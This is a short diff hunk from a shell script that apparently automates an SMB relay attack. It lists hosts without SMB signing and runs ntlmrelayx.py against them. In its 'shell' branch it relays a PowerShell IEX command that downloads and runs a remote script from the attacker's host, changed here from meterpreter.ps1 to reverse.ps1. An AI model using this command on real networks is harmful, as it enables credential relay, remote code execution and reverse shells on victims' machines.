@@ -104,7 +104,7 @@ ls .vulnerabilidades2/ | grep smb2Security | cut -d "_" -f1 > ip-smbrelay.txt
 sleep 30
 
 if [ $TYPE == "shell" ] ; then
-    ntlmrelayx.py -tf ip-smbrelay.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST:8000/meterpreter.ps1')" -smb2support
+    ntlmrelayx.py -tf ip-smbrelay.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST/reverse.ps1')" -smb2support
 fi
 
 if [ $TYPE == "share" ] ; then
